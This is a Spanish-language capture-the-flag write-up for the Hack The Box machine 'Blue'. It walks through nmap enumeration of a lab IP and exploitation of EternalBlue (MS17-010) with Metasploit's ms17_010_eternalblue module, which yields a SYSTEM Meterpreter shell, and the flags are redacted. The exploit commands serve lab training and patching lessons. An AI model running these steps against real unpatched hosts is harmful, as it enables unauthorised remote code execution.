# Blue - Hack The Box | Write Up

**Dificultad:** Easy | **OS:** Windows | **Autor:** Ph4n3s

---

## 1. Enumeración

Primero compruebo que la máquina está activa:

```bash
ping -c 5 10.129.76.203
```

Continúo con un escaneo de todos los puertos:

```bash
nmap -p- --open -T4 --min-rate 5000 10.129.76.203 -oN ~/HTB_machines/Blue/ports
```

**Puertos abiertos:**

```
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152-49157/tcp open  unknown
```

El puerto **445 (SMB)** me llama la atención enseguida. Lanzo scripts de reconocimiento sobre los puertos encontrados:

```bash
nmap -p 135,139,445,49152,49153,49154,49155,49156,49157 -sVC -T4 --min-rate 5000 10.129.76.203 -oN ~/HTB_machines/Blue/targeted
```

**Resultado relevante:**

```
445/tcp open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1
Host: HARIS-PC | OS: Windows
```

Windows 7 SP1 con SMB expuesto... esto huele a **EternalBlue (MS17-010)** desde lejos. Busco un poco para confirmarlo y efectivamente, esta versión de Windows es vulnerable a un Buffer Overflow en el servicio SMB que permite ejecución remota de código sin autenticación.

---

## 2. Explotación

Abro **msfconsole** y busco el módulo:

```bash
msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
```

Configuro el exploit:

```bash
set RHOSTS 10.129.76.203
set LHOST tun0
run
```

Obtengo una sesión **Meterpreter** como `NT AUTHORITY\SYSTEM` directamente, sin necesidad de escalar privilegios.

---

## 3. Post-Explotación / Flags

Desde Meterpreter abro una shell de Windows:

```bash
meterpreter > shell
```

**Flag de usuario (haris):**

```cmd
cd C:\Users\haris\Desktop
type user.txt
```

```
d3a5c3**************************
```

**Flag de administrador:**

```cmd
cd C:\Users\Administrator\Desktop
type root.txt
```

```
55b92b**************************
```

---

## Conclusión

Una máquina muy buena para iniciarse. El vector de ataque es **EternalBlue (CVE-2017-0144)**, uno de los exploits más conocidos de la historia, responsable del ransomware WannaCry en 2017. Al ser Windows 7 sin parchear con SMB expuesto, el acceso directo como SYSTEM lo hace una máquina sin escalada de privilegios, perfecta para entender cómo funciona este tipo de vulnerabilidad.

**Lecciones:**
- SMB expuesto en versiones antiguas de Windows = señal de alarma inmediata
- Siempre parchear sistemas, especialmente MS17-010
- EternalBlue sigue siendo relevante en entornos reales desactualizados

---

> ⚠️ *Este write up es con fines educativos. Las flags están censuradas.*
